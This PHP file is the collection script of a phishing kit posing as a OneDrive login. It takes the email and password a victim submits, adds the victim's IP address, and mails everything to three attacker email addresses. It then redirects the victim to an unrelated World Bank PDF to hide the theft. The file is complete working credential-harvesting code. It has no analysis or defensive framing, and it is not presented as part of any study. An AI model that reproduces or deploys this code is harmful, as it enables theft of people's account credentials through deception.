<?
$ip = getenv("REMOTE_ADDR");
$message .= "---- : || Onedrive tare_ama || :------\n";
$message .= "email: ".$_POST['formtext1']."\n";
$message .= "Pass: ".$_POST['formtext2']."\n";
$message .= "----: || Tare logs || :------\n";
$message .= "IP: ".$ip."\n";
$recipient ="gifted2030@outlook.com,blingbeen@yandex.com,jackymaithj1@gmail.com";
$subject = "tare other mail | ".$ip."\n";
mail($recipient,$subject,$message);
header("Location: https://openknowledge.worldbank.org/bitstream/handle/10986/25697/9781464809941.pdf");
?>